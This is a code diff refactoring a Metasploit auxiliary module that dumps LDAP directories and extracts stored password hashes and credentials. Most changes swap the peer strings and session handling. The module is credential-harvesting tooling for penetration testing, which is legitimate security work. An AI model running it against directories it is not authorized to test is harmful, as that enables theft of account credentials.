@@ -5,9 +5,10 @@
 
 class MetasploitModule < Msf::Auxiliary
 
-  include Msf::Exploit::Remote::LDAP
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
+  include Msf::Exploit::Remote::LDAP
+  include Msf::OptionalSession::LDAP
 
   def initialize(info = {})
     super(
@@ -33,7 +34,8 @@ class MetasploitModule < Msf::Auxiliary
         ],
         'DefaultAction' => 'Dump',
         'DefaultOptions' => {
-          'SSL' => true
+          'SSL' => true,
+          'RPORT' => 636
         },
         'Notes' => {
           'Stability' => [CRASH_SAFE],
@@ -44,7 +46,6 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      Opt::RPORT(636), # SSL/TLS
       OptInt.new('MAX_LOOT', [false, 'Maximum number of LDAP entries to loot', nil]),
       OptInt.new('READ_TIMEOUT', [false, 'LDAP read timeout in seconds', 600]),
       OptString.new('BASE_DN', [false, 'LDAP base DN if you already have it']),
@@ -68,7 +69,7 @@ class MetasploitModule < Msf::Auxiliary
     unless opres.error_message.to_s.empty?
       msg += " - #{opres.error_message}"
     end
-    print_error("#{peer} #{msg}")
+    print_error("#{ldap.peerinfo} #{msg}")
   end
 
   # PoC using ldapsearch(1):
@@ -85,36 +86,28 @@ class MetasploitModule < Msf::Auxiliary
 
     entries_returned = 0
 
-    print_status("#{peer} Connecting...")
     ldap_new do |ldap|
       if ldap.get_operation_result.code == 0
-        vprint_status("#{peer} LDAP connection established")
+        vprint_status("#{ldap.peerinfo} LDAP connection established")
       else
         # Even if we get "Invalid credentials" error, we may proceed with anonymous bind
         print_ldap_error(ldap)
       end
 
+      @rhost = ldap.peerhost
+      @rport = ldap.peerport
+
       if (base_dn_tmp = datastore['BASE_DN'])
-        vprint_status("#{peer} User-specified base DN: #{base_dn_tmp}")
+        vprint_status("#{ldap.peerinfo} User-specified base DN: #{base_dn_tmp}")
         naming_contexts = [base_dn_tmp]
       else
-        vprint_status("#{peer} Discovering base DN(s) automatically")
+        vprint_status("#{ldap.peerinfo} Discovering base DN(s) automatically")
 
-        begin
-          # HACK: fix lack of read/write timeout in Net::LDAP
-          Timeout.timeout(@read_timeout) do
-            naming_contexts = get_naming_contexts(ldap)
-          end
-        rescue Timeout::Error
-          fail_with(Failure::TimeoutExpired, 'The timeout expired while reading naming contexts')
-        ensure
-          unless ldap.get_operation_result.code == 0
-            print_ldap_error(ldap)
-          end
-        end
+        naming_contexts = ldap.naming_contexts
+        print_ldap_error(ldap) unless ldap.get_operation_result.code == 0
 
         if naming_contexts.nil? || naming_contexts.empty?
-          vprint_warning("#{peer} Falling back to an empty base DN")
+          vprint_warning("#{ldap.peerinfo} Falling back to an empty base DN")
           naming_contexts = ['']
         end
       end
@@ -123,14 +116,14 @@ class MetasploitModule < Msf::Auxiliary
 
       @user_attr ||= datastore['USER_ATTR']
       @user_attr ||= 'dn'
-      vprint_status("#{peer} Taking '#{@user_attr}' attribute as username")
+      vprint_status("#{ldap.peerinfo} Taking '#{@user_attr}' attribute as username")
 
       pass_attr ||= datastore['PASS_ATTR']
       @pass_attr_array = pass_attr.split(/[,\s]+/).compact.reject(&:empty?).map(&:downcase)
 
       # Dump root DSE for useful information, e.g. dir admin
       if @max_loot.nil? || (@max_loot > 0)
-        print_status("#{peer} Dumping data for root DSE")
+        print_status("#{ldap.peerinfo} Dumping data for root DSE")
 
         ldap_search(ldap, 'root DSE', {
           ignore_server_caps: true,
@@ -139,7 +132,7 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       naming_contexts.each do |base_dn|
-        print_status("#{peer} Searching base DN='#{base_dn}'")
+        print_status("#{ldap.peerinfo} Searching base DN='#{base_dn}'")
         entries_returned += ldap_search(ldap, base_dn, {
           base: base_dn
         })
@@ -165,7 +158,7 @@ class MetasploitModule < Msf::Auxiliary
       attributes: %w[* + -]
     }
     Tempfile.create do |f|
-      f.write("# LDIF dump of #{peer}, base DN='#{base_dn}'\n")
+      f.write("# LDIF dump of #{ldap.peerinfo}, base DN='#{base_dn}'\n")
       f.write("\n")
       begin
         # HACK: fix lack of read/write timeout in Net::LDAP
@@ -185,18 +178,18 @@ class MetasploitModule < Msf::Auxiliary
           end
         end
       rescue Timeout::Error
-        print_error("#{peer} Host timeout reached while searching '#{base_dn}'")
+        print_error("#{ldap.peerinfo} Host timeout reached while searching '#{base_dn}'")
         return entries_returned
       ensure
         unless ldap.get_operation_result.code == 0
           print_ldap_error(ldap)
         end
         if entries_returned > 0
-          print_status("#{peer} #{entries_returned} entries, #{creds_found} creds found in '#{base_dn}'.")
+          print_status("#{ldap.peerinfo} #{entries_returned} entries, #{creds_found} creds found in '#{base_dn}'.")
           f.rewind
           pillage(f.read, base_dn)
         elsif ldap.get_operation_result.code == 0
-          print_error("#{peer} No entries returned for '#{base_dn}'.")
+          print_error("#{ldap.peerinfo} No entries returned for '#{base_dn}'.")
         end
       end
     end
@@ -204,7 +197,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def pillage(ldif, base_dn)
-    vprint_status("#{peer} Storing LDAP data for base DN='#{base_dn}' in loot")
+    vprint_status("Storing LDAP data for base DN='#{base_dn}' in loot")
 
     ltype = base_dn.clone
     ltype.gsub!(/ /, '_')
@@ -223,11 +216,11 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     unless ldif_filename
-      print_error("#{peer} Could not store LDAP data in loot")
+      print_error('Could not store LDAP data in loot')
       return
     end
 
-    print_good("#{peer} Saved LDAP data to #{ldif_filename}")
+    print_good("Saved LDAP data to #{ldif_filename}")
   end
 
   def decode_pwdhistory(hash)
@@ -253,7 +246,7 @@ class MetasploitModule < Msf::Auxiliary
       module_fullname: fullname,
       origin_type: :service,
       address: @rhost,
-      port: rport,
+      port: @rport,
       protocol: 'tcp',
       service_name: 'ldap'
     }
@@ -369,7 +362,7 @@ class MetasploitModule < Msf::Auxiliary
       # highlight unresolved hashes
       hash_format = '{crypt}' if hash =~ /{crypt}/i
 
-      print_good("#{peer} Credentials (#{hash_format.empty? ? 'password' : hash_format}) found in #{attr}: #{dn}:#{hash}")
+      print_good("#{@rhost}:#{@rport} Credentials (#{hash_format.empty? ? 'password' : hash_format}) found in #{attr}: #{dn}:#{hash}")
 
       # known hash types should have been identified,
       # let's assume the rest are clear text passwords
